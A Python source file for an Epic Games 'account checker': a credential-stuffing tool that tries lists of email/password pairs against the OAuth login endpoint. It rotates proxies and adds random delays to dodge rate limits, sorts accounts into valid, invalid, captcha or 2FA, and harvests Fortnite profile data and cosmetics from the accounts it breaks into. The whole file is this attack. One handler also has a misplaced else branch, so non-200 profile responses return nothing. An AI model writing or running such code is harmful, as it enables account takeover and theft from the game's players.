"""
Epic Games API-based account checker
Replaces browser automation with direct API calls
"""
import asyncio
import aiohttp
import json
import time
import random
from typing import List, Tuple, Dict, Optional, Any
from enum import Enum
from urllib.parse import urlparse
import base64
from aiohttp_socks import ProxyConnector
from config.epic_credentials import (
    get_all_credentials, 
    EPIC_ENDPOINTS, 
    FORTNITE_ENDPOINTS, 
    REQUIRED_SCOPES,
    is_production_ready
)

class AccountStatus(Enum):
    VALID = "valid"
    INVALID = "invalid"
    CAPTCHA = "captcha"
    TWO_FA = "2fa"
    ERROR = "error"

class AccountCheckerCF:
    def __init__(self, proxies: List[str]):
        self.proxies = proxies
        self.proxy_index = 0
        
        # Epic Games Official Developer API endpoints
        self.oauth_url = EPIC_ENDPOINTS["oauth_token"]
        self.token_info_url = EPIC_ENDPOINTS["token_info"]
        self.accounts_url = EPIC_ENDPOINTS["accounts"]
        self.profile_url = FORTNITE_ENDPOINTS["profile"]
        
        # Load client credentials strictly from environment
        self.client_credentials = get_all_credentials()
        
        if not self.client_credentials:
            raise ValueError("No Epic Games client credentials available. Set EPIC_CLIENT_ID, EPIC_CLIENT_SECRET, EPIC_DEPLOYMENT_ID in environment.")
        
        if not is_production_ready():
            raise ValueError("Epic Games client credentials not fully configured in environment.")
        
        # Use the first (and only) credentials source
        self.current_credentials = self.client_credentials[0]
        self.client_id = self.current_credentials["client_id"]
        self.client_secret = self.current_credentials["client_secret"]
        # No defaults/fallbacks
        self.deployment_id = self.current_credentials["deployment_id"]
        self.basic_auth = base64.b64encode(f"{self.client_id}:{self.client_secret}".encode()).decode()
        self.user_agent = self.current_credentials.get("user_agent", "EpicGamesLauncher/10.15.3")
        
        # Required OAuth scopes for Epic Games API
        self.scopes = REQUIRED_SCOPES
        
        # Session for connection pooling
        self.session = None
    
    async def __aenter__(self):
        # Create aiohttp session with connection pooling
        connector = aiohttp.TCPConnector(
            limit=100,
            limit_per_host=10,
            ttl_dns_cache=300,
            use_dns_cache=True,
        )
        
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': self.user_agent,
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
            }
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.proxy_index]
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return proxy
    
    def parse_proxy(self, proxy_str: str) -> Optional[str]:
        """Parse proxy string into aiohttp format"""
        if not proxy_str:
            return None
        
        try:
            # Handle different proxy formats
            if '://' not in proxy_str:
                proxy_str = f"http://{proxy_str}"
            
            parsed = urlparse(proxy_str)
            
            if parsed.username and parsed.password:
                return f"{parsed.scheme}://{parsed.username}:{parsed.password}@{parsed.hostname}:{parsed.port}"
            else:
                return f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
                
        except Exception as e:
            print(f"❌ Error parsing proxy {proxy_str}: {e}")
            return None
    
    async def create_session_with_proxy(self, proxy_url: Optional[str] = None) -> aiohttp.ClientSession:
        """Create aiohttp session with proper proxy support"""
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        
        if proxy_url and proxy_url.startswith('socks'):
            # Use SOCKS proxy connector
            connector = ProxyConnector.from_url(proxy_url)
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={
                    'User-Agent': self.user_agent,
                    'Accept': 'application/json',
                    'Accept-Language': 'en-US,en;q=0.9',
                }
            )
        else:
            # Use regular TCP connector for HTTP proxies or no proxy
            connector = aiohttp.TCPConnector(
                limit=100,
                limit_per_host=10,
                ttl_dns_cache=300,
                use_dns_cache=True,
            )
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={
                    'User-Agent': self.user_agent,
                    'Accept': 'application/json',
                    'Accept-Language': 'en-US,en;q=0.9',
                }
            )
        
        return session
    

    
    async def verify_token(self, access_token: str) -> Dict[str, Any]:
        """
        Verify access token using Epic Games official token info endpoint
        Returns: {'valid': bool, 'account_id': str, 'display_name': str, 'error': str}
        """
        try:
            data = {'token': access_token}
            
            async with self.session.post(
                self.token_info_url,
                data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'}
            ) as response:
                response_text = await response.text()
                
                if response.status == 200:
                    try:
                        token_info = json.loads(response_text)
                        if token_info.get('active', False):
                            return {
                                'valid': True,
                                'account_id': token_info.get('account_id', ''),
                                'display_name': token_info.get('display_name', ''),
                                'expires_in': token_info.get('expires_in', 0),
                                'error': None
                            }
                        else:
                            return {
                                'valid': False,
                                'account_id': None,
                                'display_name': None,
                                'error': 'Token inactive'
                            }
                    except json.JSONDecodeError:
                        return {
                            'valid': False,
                            'account_id': None,
                            'display_name': None,
                            'error': 'Invalid token response format'
                        }
                else:
                    return {
                        'valid': False,
                        'account_id': None,
                        'display_name': None,
                        'error': f'HTTP {response.status}: {response_text[:200]}'
                    }
                    
        except Exception as e:
            return {
                'valid': False,
                'account_id': None,
                'display_name': None,
                'error': f'Token verification failed: {str(e)}'
            }
    
    async def oauth_login(self, email: str, password: str, proxy: Optional[str] = None) -> Dict[str, Any]:
        """
        Perform OAuth login using Epic Games API
        Returns: {'success': bool, 'access_token': str, 'account_id': str, 'error': str}
        """
        try:
            # Prepare proxy
            proxy_url = None
            if proxy:
                proxy_url = self.parse_proxy(proxy)
            
            # Prepare headers (Official Epic Games API format)
            headers = {
                'Authorization': f'Basic {self.basic_auth}',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': self.user_agent,
                'Accept': 'application/json'
            }
            
            # Prepare form data (Official Epic Games API format)
            data = {
                'grant_type': 'password',
                'username': email,
                'password': password,
                'scope': self.scopes,
                'deployment_id': self.deployment_id
            }
            
            print(f"🔑 {email} - Attempting OAuth login...")
            
            # Create session with proper proxy support
            session = await self.create_session_with_proxy(proxy_url)
            
            try:
                # Make OAuth request
                if proxy_url and proxy_url.startswith('socks'):
                    # For SOCKS proxies, don't pass proxy parameter (it's handled by connector)
                    async with session.post(
                        self.oauth_url,
                        headers=headers,
                        data=data
                    ) as response:
                        response_text = await response.text()
                        return await self._process_oauth_response(response, response_text, email, password, proxy)
                else:
                    # For HTTP proxies or no proxy, use the traditional method
                    async with session.post(
                        self.oauth_url,
                        headers=headers,
                        data=data,
                        proxy=proxy_url
                    ) as response:
                        response_text = await response.text()
                        return await self._process_oauth_response(response, response_text, email, password, proxy)
            finally:
                await session.close()
                
        except Exception as e:
            print(f"❌ {email} - OAuth error: {str(e)}")
            return {
                'success': False,
                'access_token': None,
                'account_id': None,
                'error': str(e)
            }
    
    async def _process_oauth_response(self, response, response_text: str, email: str, password: str, proxy: Optional[str]) -> Dict[str, Any]:
        """Process OAuth response and handle different status codes"""
        try:
            if response.status == 200:
                try:
                    response_data = json.loads(response_text)
                    
                    if 'access_token' in response_data and 'account_id' in response_data:
                        print(f"✅ {email} - OAuth login successful")
                        return {
                            'success': True,
                            'access_token': response_data['access_token'],
                            'account_id': response_data['account_id'],
                            'error': None
                        }
                    else:
                        print(f"❌ {email} - OAuth response missing required fields")
                        return {
                            'success': False,
                            'access_token': None,
                            'account_id': None,
                            'error': 'Missing access_token or account_id in response'
                        }
                except json.JSONDecodeError:
                    print(f"❌ {email} - Invalid JSON response from OAuth")
                    return {
                        'success': False,
                        'access_token': None,
                        'account_id': None,
                        'error': 'Invalid JSON response'
                    }
            else:
                # Try to parse error response
                try:
                    error_data = json.loads(response_text)
                    error_msg = error_data.get('errorMessage', f'HTTP {response.status}')
                    error_code = error_data.get('errorCode', 'unknown')
                    
                    print(f"❌ {email} - OAuth failed: {error_code} - {error_msg}")
                    
                    # Check for specific error types
                    if 'invalid_grant' in error_code.lower():
                        return {
                            'success': False,
                            'access_token': None,
                            'account_id': None,
                            'error': 'Invalid credentials'
                        }
                    elif ('unauthorized_client' in error_code.lower() or 
                          'client_disabled' in error_code.lower() or
                          'invalid_client' in error_code.lower()):
                        # Client credentials issue - no switching, just report the error
                        return {
                            'success': False,
                            'access_token': None,
                            'account_id': None,
                            'error': f'Client credentials error: {error_code}'
                        }
                    elif 'captcha' in error_msg.lower():
                        return {
                            'success': False,
                            'access_token': None,
                            'account_id': None,
                            'error': 'Captcha required'
                        }
                    elif '2fa' in error_msg.lower() or 'two_factor' in error_msg.lower():
                        return {
                            'success': False,
                            'access_token': None,
                            'account_id': None,
                            'error': '2FA required'
                        }
                    else:
                        return {
                            'success': False,
                            'access_token': None,
                            'account_id': None,
                            'error': f'{error_code}: {error_msg}'
                        }
                except json.JSONDecodeError:
                    print(f"❌ {email} - HTTP {response.status}: {response_text[:200]}")
                    return {
                        'success': False,
                        'access_token': None,
                        'account_id': None,
                        'error': f'HTTP {response.status}'
                    }
        
        except asyncio.TimeoutError:
            print(f"⏰ {email} - OAuth request timeout")
            return {
                'success': False,
                'access_token': None,
                'account_id': None,
                'error': 'Request timeout'
            }
        except Exception as e:
            print(f"❌ {email} - OAuth error: {e}")
            return {
                'success': False,
                'access_token': None,
                'account_id': None,
                'error': str(e)
            }
    
    async def fetch_profile(self, access_token: str, account_id: str, proxy: Optional[str] = None) -> Dict[str, Any]:
        """
        Fetch Athena profile data using Epic Games API
        Returns: {'success': bool, 'profile_data': dict, 'error': str}
        """
        try:
            # Prepare proxy
            proxy_url = None
            if proxy:
                proxy_url = self.parse_proxy(proxy)
            
            # Prepare headers
            headers = {
                'Authorization': f'bearer {access_token}',
                'Content-Type': 'application/json',
            }
            
            # Profile URL with query parameters
            url = self.profile_url.format(account_id) + "?profileId=athena&rvn=-1"
            
            print(f"📊 {account_id} - Fetching profile data...")
            
            # Create session with proper proxy support
            session = await self.create_session_with_proxy(proxy_url)
            
            try:
                # Make profile request
                if proxy_url and proxy_url.startswith('socks'):
                    # For SOCKS proxies, don't pass proxy parameter (it's handled by connector)
                    async with session.post(
                        url,
                        headers=headers,
                        json={}  # Empty JSON body
                    ) as response:
                        response_text = await response.text()
                        return await self._process_profile_response(response, response_text, account_id)
                else:
                    # For HTTP proxies or no proxy, use the traditional method
                    async with session.post(
                        url,
                        headers=headers,
                        json={},  # Empty JSON body
                        proxy=proxy_url
                    ) as response:
                        response_text = await response.text()
                        return await self._process_profile_response(response, response_text, account_id)
            finally:
                await session.close()
                
        except Exception as e:
            print(f"❌ {account_id} - Profile fetch error: {str(e)}")
            return {
                'success': False,
                'profile_data': None,
                'error': str(e)
            }
    
    async def _process_profile_response(self, response, response_text: str, account_id: str) -> Dict[str, Any]:
        """Process profile response"""
        try:
            if response.status == 200:
                try:
                    profile_data = json.loads(response_text)
                    print(f"✅ {account_id} - Profile data fetched successfully")
                    return {
                        'success': True,
                        'profile_data': profile_data,
                        'error': None
                    }
                except json.JSONDecodeError:
                    print(f"❌ {account_id} - Invalid JSON in profile response")
                    return {
                        'success': False,
                        'profile_data': None,
                        'error': 'Invalid JSON in profile response'
                    }
                else:
                    print(f"❌ {account_id} - Profile fetch failed: HTTP {response.status}")
                    return {
                        'success': False,
                        'profile_data': None,
                        'error': f'HTTP {response.status}: {response_text[:200]}'
                    }
        
        except asyncio.TimeoutError:
            print(f"⏰ {account_id} - Profile request timeout")
            return {
                'success': False,
                'profile_data': None,
                'error': 'Profile request timeout'
            }
        except Exception as e:
            print(f"❌ {account_id} - Profile fetch error: {e}")
            return {
                'success': False,
                'profile_data': None,
                'error': str(e)
            }
    
    async def check_account(self, email: str, password: str) -> Tuple[AccountStatus, Dict[str, Any]]:
        """
        Check Epic Games account and fetch profile data
        Returns: (status, profile_info)
        """
        print(f"🔍 Checking Epic Games account: {email}")
        
        # Get proxy for this account
        proxy = None
        if self.proxies:
            proxy_str = self.proxies[hash(email) % len(self.proxies)]
            print(f"🌐 {email} - Using proxy: {proxy_str}")
            proxy = proxy_str
        else:
            print(f"⚠️ {email} - No proxy configured")
        
        # Step 1: OAuth login
        oauth_result = await self.oauth_login(email, password, proxy)
        
        if not oauth_result['success']:
            error = oauth_result['error']
            
            # Determine status based on error
            if 'captcha' in error.lower():
                return AccountStatus.CAPTCHA, {'error': error}
            elif '2fa' in error.lower() or 'two_factor' in error.lower():
                return AccountStatus.TWO_FA, {'error': error}
            elif 'invalid credentials' in error.lower():
                return AccountStatus.INVALID, {'error': error}
            else:
                return AccountStatus.ERROR, {'error': error}
        
        # Step 2: Fetch profile data
        access_token = oauth_result['access_token']
        account_id = oauth_result['account_id']
        
        profile_result = await self.fetch_profile(access_token, account_id, proxy)
        
        if not profile_result['success']:
            # OAuth succeeded but profile fetch failed - still count as valid
            print(f"⚠️ {email} - Profile fetch failed but account is valid")
            return AccountStatus.VALID, {
                'account_id': account_id,
                'profile_error': profile_result['error']
            }
        
        # Step 3: Parse profile data
        profile_data = profile_result['profile_data']
        parsed_profile = self.parse_profile_data(profile_data)
        
        return AccountStatus.VALID, {
            'account_id': account_id,
            **parsed_profile
        }
    
    def parse_profile_data(self, profile_data: Dict[str, Any]) -> Dict[str, Any]:
        """Parse Epic Games profile data to extract stats and cosmetics"""
        try:
            # Extract profile from profileChanges
            if 'profileChanges' not in profile_data or not profile_data['profileChanges']:
                return {'parse_error': 'No profileChanges found'}
            
            profile = profile_data['profileChanges'][0].get('profile', {})
            
            # Extract basic profile info
            result = {
                'created_at': profile.get('created', ''),
                'updated_at': profile.get('updated', ''),
            }
            
            # Extract stats from profile.stats.attributes
            stats = profile.get('stats', {}).get('attributes', {})
            result.update({
                'battle_pass_purchased': stats.get('book_purchased', False),
                'battle_pass_level': stats.get('book_level', 0),
                'lifetime_wins': stats.get('lifetime_wins', 0),
                'seasonal_level': stats.get('level', 0),
                'account_level': stats.get('accountLevel', 0),
                'past_seasons': stats.get('past_seasons', [])
            })
            
            # Extract cosmetics from profile.items
            items = profile.get('items', {})
            if items:
                from .cosmetic_parser import CosmeticParser
                parser = CosmeticParser()
                
                result.update({
                    'outfits': parser.get_outfits(items),
                    'back_blings': parser.get_back_blings(items),
                    'gliders': parser.get_gliders(items),
                    'pickaxes': parser.get_pickaxes(items)
                })
            else:
                result.update({
                    'outfits': '',
                    'back_blings': '',
                    'gliders': '',
                    'pickaxes': ''
                })
            
            return result
            
        except Exception as e:
            print(f"❌ Error parsing profile data: {e}")
            return {'parse_error': str(e)}
    
    async def check_accounts_batch(self, accounts: List[Tuple[str, str]], progress_callback=None) -> Dict[str, List[Tuple[str, str, Dict[str, Any]]]]:
        """Check multiple accounts with progress tracking"""
        results = {
            'valid': [],
            'invalid': [],
            'captcha': [],
            '2fa': [],
            'error': []
        }
        
        for i, account in enumerate(accounts):
            email, password = account
            status, profile_info = await self.check_account(email, password)
            
            # Store account with profile info
            account_data = (email, password, profile_info)
            
            if status == AccountStatus.VALID:
                results['valid'].append(account_data)
            elif status == AccountStatus.INVALID:
                results['invalid'].append(account_data)
            elif status == AccountStatus.CAPTCHA:
                results['captcha'].append(account_data)
            elif status == AccountStatus.TWO_FA:
                results['2fa'].append(account_data)
            else:  # ERROR
                results['error'].append(account_data)
            
            # Call progress callback if provided
            if progress_callback:
                await progress_callback(i + 1, len(accounts))
            
            # Add delay between accounts to avoid rate limiting
            if i < len(accounts) - 1:  # Don't sleep after the last account
                await asyncio.sleep(random.uniform(1, 3))
        
        return results